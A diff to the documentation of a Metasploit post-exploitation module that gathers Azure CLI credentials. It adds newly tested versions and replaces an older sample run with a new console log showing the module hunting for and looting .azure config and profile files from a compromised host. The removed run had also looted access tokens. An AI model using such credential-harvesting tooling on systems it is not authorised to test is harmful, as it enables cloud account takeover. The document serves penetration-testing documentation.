@@ -8,6 +8,8 @@ Successfully tested on:
 
 * Azure CLI 2.0.33 on Windows Server 2012 R2, and Windows 10
 * azure-cli 2.0.33-1.el7 on openSUSE Tumbleweed 20180517
+* Azure CLI 2.61.0 on Windows 10
+* Azure CLI 2.35.0 on [Docker](https://github.com/rapid7/metasploit-framework/pull/10113#issuecomment-2191464809)
 
 ## Verification Steps
 
@@ -39,7 +41,7 @@ Successfully tested on:
 [*] Post module execution completed
 ```
 
-### Windows 10
+### 2.61.0 on Windows 10
 
 ```
 msf6 post(multi/gather/azure_cli_creds) > rerun
@@ -96,30 +98,90 @@ msf6 post(multi/gather/azure_cli_creds) > rerun
 msf6 post(multi/gather/azure_cli_creds) > 
 ```
 
-### Older Run
+### 2.35.0 on Docker
 
 ```
-msf5 post(multi/gather/azure_cli_creds) > run
+msf6 post(multi/gather/azure_cli_creds) > run
 
-[+] /home/james/.azure/accessTokens.json stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.jwt_tok_029844.txt
-[+] /home/james/.azure/azureProfile.json stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.azure_p_897386.txt
-[+] /home/james/.azure/config stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.config_976372.txt
-Subscriptions
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_railgun_api_multi, stdapi_railgun_memread, stdapi_railgun_memwrite, stdapi_registry_check_key_exists, stdapi_registry_create_key, stdapi_registry_delete_key, stdapi_registry_enum_key_direct, stdapi_registry_enum_value_direct, stdapi_registry_load_key, stdapi_registry_open_key, stdapi_registry_query_value_direct, stdapi_registry_set_value_direct, stdapi_registry_unload_key, stdapi_sys_config_getprivs
+[*] Unable to determine az cli version
+[*] Looking for az cli data in /bin
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /dev
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /home/user
+[*]   Checking for config files
+[+]     .azure/config stored in /home/mtcyr/.msf4/loot/20240627140350_default_172.17.0.2_azure.config.ini_433702.txt
+[*]   Checking for context files
+[*]   Checking for profile files
+[+]     .azure/azureProfile.json stored in /home/mtcyr/.msf4/loot/20240627140350_default_172.17.0.2_azure.profile.js_201042.txt
+[*] Looking for az cli data in /nonexistent
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /root
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /usr/games
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /usr/sbin
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/backups
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/cache/man
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/lib/gnats
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/list
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/mail
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/run/ircd
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/spool/lpd
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/spool/news
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/spool/uucp
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[*] Looking for az cli data in /var/www
+[*]   Checking for config files
+[*]   Checking for context files
+[*]   Checking for profile files
+[+] Subscriptions
 =============
 
-Source                                Account Name              Username                  Cloud Name
-------                                ------------              --------                  ----------
-/home/james/.azure/azureProfile.json  Some Azure Account Name   example.user@example.com  AzureCloud
-/home/james/.azure/azureProfile.json  Some Azure Account Name2  example.user@example.com  AzureCloud
-
-
-Tokens
-======
-
-Source                                Username                  Count
-------                                --------                  -----
-/home/james/.azure/accessTokens.json  example.user@example.com  2
+ Account Name               Username                                          Cloud Name
+ ------------               --------                                          ----------
+ N/A(tenant level account)  example123@example12345678901234.onmicrosoft.com  AzureCloud
 
 [*] Post module execution completed
-
 ```
